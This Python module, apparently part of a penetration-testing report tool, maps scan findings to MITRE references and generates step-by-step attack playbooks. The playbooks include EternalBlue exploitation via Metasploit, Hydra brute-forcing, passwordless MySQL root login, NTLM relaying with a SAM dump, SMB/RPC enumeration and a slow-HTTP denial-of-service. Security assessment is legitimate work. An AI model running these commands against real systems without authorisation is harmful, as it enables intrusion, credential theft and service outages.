"""Обогащение находок данными MITRE, описанием атакуемого ПО и плейбуком.

Все факты берутся из локального среза MITRE и входных данных; модуль
ничего не выдумывает — отсутствующие сведения помечаются явно.
"""

from __future__ import annotations

from .knowledge import Knowledge
from .loaders import parse_banner
from .models import AttackVector, ScanContext

_PORT_COMPONENT = {
    135: "Подсистема RPC/DCOM (удалённый вызов процедур Windows)",
    139: "Сетевой файловый обмен SMB (NetBIOS)",
    445: "Сетевой файловый обмен SMB",
    902: "VMware Workstation — демон аутентификации (vmware-authd)",
    912: "VMware Workstation — демон аутентификации (vmware-authd)",
    3306: "СУБД MySQL",
    3389: "Удалённый рабочий стол (RDP)",
    8443: "HTTPS-сервис управления",
}

_IMPACT = {
    "remote_code_execution": "Удалённое выполнение произвольного кода, потенциально с системными привилегиями; полный контроль над узлом.",
    "information_disclosure": "Раскрытие сведений о системе, ресурсах и учётных записях, полезных для последующих атак.",
    "credential_theft": "Кража учётных данных пользователей или служб.",
    "man_in_the_middle": "Перехват и ретрансляция аутентификации, доступ от имени жертвы.",
    "relay_attack": "Ретрансляция аутентификации к другому узлу и доступ от имени жертвы.",
    "brute_force": "Подбор учётных данных и несанкционированный доступ к сервису.",
    "authentication_bypass": "Обход аутентификации и доступ к защищённой функциональности.",
    "denial_of_service": "Отказ в обслуживании: сервис или узел становится недоступен.",
    "misconfiguration": "Использование небезопасной конфигурации для расширения доступа.",
    "known_vulnerability": "Эксплуатация известной уязвимости целевого сервиса.",
}


def _target(ctx: ScanContext) -> str:
    return ctx.target_ip or "<target>"


def build_references(av: AttackVector, kb: Knowledge) -> dict:
    """Цепочка CVE -> CWE -> CAPEC -> ATT&CK с описаниями из локальной базы."""
    cve_refs, cwe_ids, capec_ids, tech_ids = [], [], [], []

    for cve in av.cve_ids:
        data = kb.cve(cve)
        if data:
            cve_refs.append({
                "id": cve,
                "name": data.get("name", ""),
                "description": data.get("description", ""),
                "cvss": data.get("cvss"),
                "cpe_affected": data.get("affected_product", ""),
            })
            cwe_ids += data.get("cwe", [])
            capec_ids += data.get("capec", [])
            tech_ids += data.get("attack", [])
        else:
            cve_refs.append({"id": cve, "name": "", "description": "Нет в локальном срезе MITRE — требуется выгрузка из NVD.", "cvss": None, "cpe_affected": ""})

    if not tech_ids:
        tech = kb.technique_for_attack_type(av.attack_type)
        if tech:
            tech_ids.append(tech)

    dedup = lambda seq: list(dict.fromkeys(seq))
    return {
        "cve": cve_refs,
        "cwe": [kb.cwe(c) for c in dedup(cwe_ids)],
        "capec": [kb.capec(c) for c in dedup(capec_ids)],
        "attack": [kb.technique(t) for t in dedup(tech_ids)],
    }


def build_target_software(av: AttackVector, ctx: ScanContext, kb: Knowledge) -> dict:
    """Атакуемое ПО: что это, к какому компоненту относится и что произойдёт."""
    op = ctx.external_ports.get(av.target_port)
    banner_info = parse_banner(op.service if op else "", op.banner if op else "") if op else {}

    product = ""
    version = banner_info.get("version", "")
    for cve in av.cve_ids:
        data = kb.cve(cve)
        if data and data.get("affected_product"):
            product = data["affected_product"]
            break
    if not product:
        product = av.inferred_product or banner_info.get("product", "") or av.target_service or (op.service if op else "")

    if not version and av.cve_ids and any("os" in (kb.cve(c) or {}).get("match", {}) for c in av.cve_ids):
        version = f"{ctx.server.os_name} {ctx.server.os_version}".strip()

    return {
        "product": product or "неизвестно",
        "version_observed": version,
        "system_component": _PORT_COMPONENT.get(av.target_port, f"Сетевой сервис на порту {av.target_port}"),
        "impact_if_exploited": _IMPACT.get(av.attack_type, "Компрометация целевого сервиса."),
    }


def _step(n: int, action: str, command: str, expected: str) -> dict:
    return {"n": n, "action": action, "command": command, "expected_result": expected}


def build_playbook(av: AttackVector, ctx: ScanContext, kb: Knowledge) -> dict:
    """Пошаговый сценарий воспроизведения: инструменты, команды, ожидаемые результаты."""
    target = _target(ctx)
    port = av.target_port
    tools = [t.strip() for t in (av.tools_used or "").split(",") if t.strip()]
    steps: list[dict] = []
    source = "шаблон по типу атаки"

    msf_module = ""
    for cve in av.cve_ids:
        data = kb.cve(cve)
        if data and data.get("exploit", {}).get("metasploit"):
            msf_module = data["exploit"]["metasploit"]
            break

    name = av.name.lower()
    atype = av.attack_type

    if "ms17-010" in name or "eternal" in name:
        module = msf_module or "exploit/windows/smb/ms17_010_eternalblue"
        source = f"metasploit:{module}"
        steps = [
            _step(1, "Подтвердить наличие SMBv1", f"nmap -p{port} --script smb-protocols {target}", "В выводе присутствует SMBv1"),
            _step(2, "Проверить уязвимость MS17-010", f"nmap -p{port} --script smb-vuln-ms17-010 {target}", "Скрипт сообщает VULNERABLE"),
            _step(3, "Запустить эксплойт", f"msfconsole -q -x 'use {module}; set RHOSTS {target}; run'", "Открыта Meterpreter-сессия с правами SYSTEM"),
        ]
        if "Metasploit" not in tools:
            tools.append("Metasploit")
    elif atype == "brute_force" or "brute" in name:
        svc = "mysql" if (port == 3306 or "mysql" in name) else (av.target_service or "service").lower()
        steps = [
            _step(1, "Уточнить сервис и версию", f"nmap -p{port} -sV {target}", f"Подтверждён {svc} на порту {port}"),
            _step(2, "Подобрать учётные данные", f"hydra -L users.txt -P passwords.txt {svc}://{target}:{port}", "Найдена валидная пара логин/пароль"),
            _step(3, "Войти под подобранными данными", f"mysql -h {target} -P {port} -u <user> -p", "Получено приглашение MySQL"),
        ]
        tools = tools or ["Hydra", "mysql client"]
    elif "no auth" in name or atype == "authentication_bypass":
        steps = [
            _step(1, "Подключиться без аутентификации", f"mysql -h {target} -P {port} -u root --skip-password", "Получен доступ без пароля"),
            _step(2, "Проверить привилегии", "SHOW GRANTS; SELECT current_user();", "Подтверждены доступные права"),
        ]
        tools = tools or ["mysql client"]
    elif atype in ("man_in_the_middle", "relay_attack") or "relay" in name or "signing" in name:
        steps = [
            _step(1, "Запустить перехватчик", "responder -I <iface> -wrf", "Сбор NetNTLM-хэшей из широковещательных запросов"),
            _step(2, "Ретранслировать аутентификацию", f"ntlmrelayx.py -t smb://{target} -smb2support", "Сессия от имени жертвы / дамп SAM"),
        ]
        tools = tools or ["Responder", "Impacket (ntlmrelayx)"]
    elif atype == "information_disclosure" or "enum" in name:
        if port == 135:
            steps = [
                _step(1, "Перечислить RPC-интерфейсы", f"rpcclient -U '' -N {target}", "Доступны srvinfo / enumdomusers"),
                _step(2, "Снять сведения о домене и пользователях", "rpcclient> enumdomusers; querydominfo", "Список пользователей и параметров домена"),
            ]
            tools = tools or ["rpcclient"]
        else:
            steps = [
                _step(1, "Перечислить SMB-ресурсы", f"smbclient -L //{target}/ -N", "Список доступных общих папок"),
                _step(2, "Глубокая инвентаризация", f"enum4linux -a {target}", "Пользователи, политики, ресурсы"),
            ]
            tools = tools or ["smbclient", "enum4linux"]
    elif atype == "denial_of_service" or "denial" in name or "slowloris" in name:
        steps = [
            _step(1, "Запустить нагрузочную атаку", f"slowhttptest -c 1000 -H -u http://{target}:{port}", "Рост числа удерживаемых соединений"),
            _step(2, "Зафиксировать отказ", f"curl -m 5 http://{target}:{port}", "Сервис перестаёт отвечать (timeout)"),
        ]
        tools = tools or ["slowhttptest"]
    elif msf_module:
        source = f"metasploit:{msf_module}"
        steps = [
            _step(1, "Уточнить сервис", f"nmap -p{port} -sV {target}", f"Подтверждён целевой сервис на порту {port}"),
            _step(2, "Запустить модуль Metasploit", f"msfconsole -q -x 'use {msf_module}; set RHOSTS {target}; run'", "Признаки успешной эксплуатации (сессия/вывод)"),
        ]
        if "Metasploit" not in tools:
            tools.append("Metasploit")
    else:
        steps = [
            _step(1, "Идентифицировать сервис и версию", f"nmap -p{port} -sV {target}", f"Определены продукт и версия на порту {port}"),
            _step(2, "Подобрать публичный эксплойт", f"searchsploit {av.target_service or av.name}", "Найден подходящий PoC/модуль"),
            _step(3, "Выполнить и зафиксировать результат", "<запуск эксплойта согласно PoC>", "Достигнут эффект, заявленный в описании атаки"),
        ]

    return {"tools": tools, "steps": steps, "source": source}
